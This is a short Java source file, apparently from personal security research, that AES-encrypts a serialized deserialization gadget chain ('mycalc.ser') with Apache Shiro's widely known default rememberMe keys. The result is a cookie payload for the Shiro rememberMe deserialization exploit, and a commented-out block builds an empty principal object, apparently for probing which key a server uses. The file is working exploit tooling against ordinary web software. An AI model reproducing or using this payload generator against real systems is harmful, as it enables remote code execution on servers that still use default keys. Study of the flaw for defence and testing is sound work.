package priv.ga0weI.demoshrio;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.util.PriorityQueue;

/**
 * @author ga0weI
 * @time 2022/3/25
 */
public class Encryptforpayload {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath( "mycalc.ser"));//调用链序列化

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));
//        byte[] key = Base64.decode(CodecSupport.toBytes("bya2HkYo57u6fWh5theAWw=="));
        ByteSource ciphertext = aes.encrypt(payloads, key);
        String result = ciphertext.toString();
        System.out.println("加密之后：\n"+result);
        ByteSource mingwen = aes.decrypt(ciphertext.getBytes(),key);
        System.out.println("解密之后：\n"+Base64.decodeToString(mingwen.toString()));


        //构造空principal对象

//        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
//        oos.writeObject(simplePrincipalCollection);
//        oos.close();
//
//        AesCipherService aes = new AesCipherService();
////        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));
//        byte[] key = Base64.decode(CodecSupport.toBytes("bya2HkYo57u6fWh5theAWw=="));
//        ByteSource ciphertext = aes.encrypt(byteArrayOutputStream.toByteArray(), key);
//        String result = ciphertext.toString();
//        System.out.println("加密之后：\n"+result);



    }
}